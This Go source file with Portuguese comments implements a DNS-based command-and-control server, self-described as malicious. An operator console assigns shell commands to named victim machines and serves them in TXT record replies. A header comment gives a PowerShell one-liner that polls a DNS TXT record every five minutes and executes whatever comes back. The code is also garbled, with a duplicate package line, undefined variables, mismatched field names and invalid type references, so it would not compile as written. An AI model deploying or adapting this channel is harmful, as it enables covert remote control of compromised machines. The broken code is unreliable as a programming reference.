// Executar no servidor :
//	   			   cmd 	qualquer_coisa.mesmo.com  calc.exe
// powershell . (nslookup -q=TXT google.com 8.8.8.8)[5]  # Executado a cada 5 minutos

package main
package dns

import (
	"fmt"
	"net"
	"strings"
	"bufio"
	"os"
	"github.com/miekg/dns"
)

type ServerState struct {
	Listen string    // Tipo string.  Vai ser o ADDR que o servidor vai escutar.
	Domain string
	DefaultTtl uint
	ResultTtl uint
	commands map[string]string
}

type DnsServer struct {
	State *ServerState
	Server *dns.Server
}

// Funcao para adicionar dados ao pacote DNS  (preencher com dados passados)
func (is *DnsServer) AppendResult(q dns.Question, m *dns.Msg, rr dns.RR, ttl uint) {
	hdr := dns.RR_Header{Name: q.Name, Class: q.QClass, Ttl: uint32(ttl)}

	if rrS, ok := rr.(*dns.A); ok {
			hdr.Rrtype = dns.TypeA
			rrS.Hdr = hdr
	} else if rrS, ok := rr.(dns.AAAA); ok {
			hdr.Rrtype = dns.TypeAAAA
			rrS.Hdr = hdr
	} else if rrS, ok := rr.(dns.CNAME); ok {
			hdr.Rrtype = dns.TypeCNAME
			rrS.Hdr = hdr
	} else if rrS, ok := rr.(dns.TXT); ok {
			hdr.Rrtype = dns.TypeTXT
			rrS.Hdr = hdr
	}

	// Adicionando a resposta na parte correta do pacote dependendo do tipo
	if q.Qtype == dns.typeANY || q.Qtype == rr.Header().Rrtype {
			m.Answer = append(m.Answer, rr)
	} else{
			m.Extra = append(m.Extra, rr)
	}
}


//  Onde se dará de fato início ao servidor malicioso
func (is *DnsServer) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)

	pretendIp4 :=   net.ParseIP("127.0.0.1")
	pretendIp6 :=   net.ParseIP("::1")

	for _, q := range r.Question {    // Literalmente um LOOP pelo pacote buscando as informações de campos necessários

	switch q.Qtype {
		case dns.TypeA:
				fmt.Printf("New A request for %s\n", q.Name)
				is.AppendResult(q, m, &dns.A{A: pretendIp4}, is.State.DefaultTtl)  // Tudo isso significa

		case dns.TypeAAAA:
				fmt.Printf("New AAAA request for %s\n", q.Name)
				is.AppendResult(q, m, &dns.AAAA{AAAA: pretendIp4}, is.State.DefaultTtl)   // Nao volte a me perguntar sobre isso

		case dns.TypeANY:
				fmt.Printf("New ANY request for %s\n", q.Name)
				is.AppendResult(q, m, &dns.A{A: pretendIp4}, is.State.DefaultTtl)   // Por meras 3 horas
				is.AppendResult(q, m, &dns.AAAA{AAAA: pretendIp4}, is.State.DefaultTtl)  // E utilize o seu DNS CACHE

		case dns.Type.TXT:
			fmt.Printf("New TXT request for %s\n", q.Name)

			if strings.HasSuffix(q.Name, is.State.Domain){

				machine_name := q.Name[0:len(q.Name) - len(is.State.Domain)]  // Igual Python mesmo ksks
				fmt.Printf("Machine name is %s\n", machine_name)

				val, found := is.State.Commands[machine]

				if found {
					is.AppendResult(q, m, &dns.TXT{Txt: []string{val}}, is.State.ResultTtl)  // Se for um texto, entao pode descartar do CACHE depois de 3 segundos, para se comunicar novamente sempre que quiser de 3 em 3 segundos.
				} else {
					is.AppendResult(q, m, &dns.TXT{txt: []string{""}}, is.State.ResultTtl)
				}
		}  else {
					is.AppendResult(q, m, &dns.TXT{Txt: []string{"Nope"}}, is.State.DefaultTtl)
			}
	}
 }

	w.WriteMsg(m)
}

func (is *DnsServer) SetCommand(args []string){
        machine := args[0]
        command := strings.Join(args[1:], " ")  // Que nem o join do python
        is.State.Commands[machine] = command
        fmt.Printf("Command for %s ser to: %s\n", machine, command)
}

// Funcao para modificar o que vai ser enviado como resposta
// Pelo servidor quando quiser.
func (is *DnsServer) ConsoleHandler() {
reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Printf("DNS > ")
		input, err := reader.ReadString('\n')  // Ler ate encontrar um \n
		if err == nil {  // Se nao houve erro.  (nil) = Sem erros
			// words := input.TrimSpace(input)  // Removendo ESPACOS ou \t ou \n no comeco ou final da string
			words := strings.Split(strings.TrimSpace(input), " ")

			switch words[0] {
			case "quit":
				is.Server.Shutdown()
				break
			case "cmd":
				is.SetCommand(words[1:])  // Da segunda palavra ate o final
			}
		}
	}
}

//  Test with  nslookup  -port=5553 -q=TXT jardeath.a.ly localhost
func main() {
	is := &DnsServer{
	State: &ServerState{
		Listen: "0.0.0.0:5553",
		Domain: "a.ly.",   // Final dot in the end
		DefaultTtl: 10800,
		ResultTtl: 3,
		Commands: make(map[string]string)},
	}

	fmt.Printf("Listening on %s\n", is.State.Listen)

	//is.State.Commands["nobody"] = "id"

	is.Server = &dns.Server{Addr: is.State.Listen, Net: "udp", Handler: is}
	defer is.Server.Shutdown()   // Antes da main terminar,o servidor vai ser desligado.

	go is.ConsoleHandler()

	err := server.Server.ListenAndServe()
	if err != nil {
			panic(err)
	}
}
